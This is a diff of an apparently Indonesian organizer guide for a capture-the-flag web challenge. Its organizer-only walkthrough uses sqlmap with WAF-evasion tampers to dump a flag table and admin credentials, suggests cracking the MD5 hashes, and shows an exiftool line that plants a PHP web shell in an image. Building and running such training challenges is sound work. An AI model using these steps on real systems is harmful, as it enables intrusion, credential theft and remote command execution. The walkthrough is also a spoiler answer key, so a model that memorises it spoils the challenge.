@@ -40,8 +40,15 @@ Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya d
 
 ## Tingkat Kesulitan Easy — apa yang berubah
 
-1. **Error-based SQLi** — pesan error MySQL ditampilkan langsung di halaman. sqlmap bisa langsung pakai teknik error-based/union tanpa tamper apa pun.
-2. **Tanpa WAF** — tidak ada filter keyword/spasi. Payload apa pun lolos.
+1. **Error-based SQLi + WAF ringan** — error MySQL tetap ditampilkan, tapi
+   input yang mengandung **spasi** atau operator **`>`** diblok WAF.
+   sqlmap default akan keblokir; solusinya sederhana dan pasti:
+   ```bash
+   sqlmap -u "http://<server>:8001/detail.php?id=1" \
+     --tamper=space2comment,between --batch
+   ```
+   (`space2comment` spasi→`/**/`, `between` `>`→`BETWEEN n AND m`)
+2. **Tanpa WAF keyword** — UNION/SELECT/information_schema tetap lolos.
 3. **Rate limit nyaris hilang** — limit di-set sangat tinggi (100.000 req/menit untuk SQLi, 1.000 percobaan login), jadi praktis tidak terasa. sqlmap jalan full speed tanpa `--delay`.
 4. **Flag** — semua flag tetap di dalam database.
 5. **Decoy tetap ada** — tabel `knights_messages` berisi pesan pengecoh (bonus edukasi, tidak menghalangi).
@@ -93,22 +100,24 @@ exiftool -Comment='<?PHP system($_GET["c"]); ?>' lain.png -o avatar.png
 
 ## Walkthrough (ORGANIZER ONLY — spoiler)
 
-```bash
-# 0. Deteksi injeksi (error-based langsung ketemu)
-sqlmap -u "http://<server>:8001/detail.php?id=1" --batch
+  ```bash
+  # 0. Deteksi injeksi — WAF blok spasi & ">", jadi langsung pakai tamper
+  sqlmap -u "http://<server>:8001/detail.php?id=1" \
+    --tamper=space2comment,between --batch
+  
+  # 1. Enumerasi database
+  sqlmap -u "http://<server>:8001/detail.php?id=1" \
+    --tamper=space2comment,between --batch --dbs
+  #    -> lain, lain_content, information_schema
 
-# 1. Enumerasi database
-sqlmap -u "http://<server>:8001/detail.php?id=1" --batch --dbs
-#    -> lain, admin, information_schema
-
-# 2. Dump tabel secrets
-sqlmap ... -D lain -T secrets --dump
+  # 2. Dump tabel secrets
+  sqlmap ... --tamper=space2comment,between -D lain -T secrets --dump
 #    -> flag_sqli = FLAG 1
 #    -> decoy    = FLAG_DECOY (jebakan)
 #    -> flag_admin TIDAK ADA di sini (tidak pernah disimpan di DB)
 
-# 3. Dump kredensial admin asli
-sqlmap ... -D lain -T admin_users --dump
+  # 3. Dump kredensial admin asli
+  sqlmap ... --tamper=space2comment,between -D lain -T admin_users --dump
 #    -> username: lain_chrono | password_hash: MD5(password)
 #    Easy: hash MD5 crackable di laptop biasa. hashcat -m 0 / john,
 #    atau tempel ke crackstation.net — password dibuat wordlist-friendly
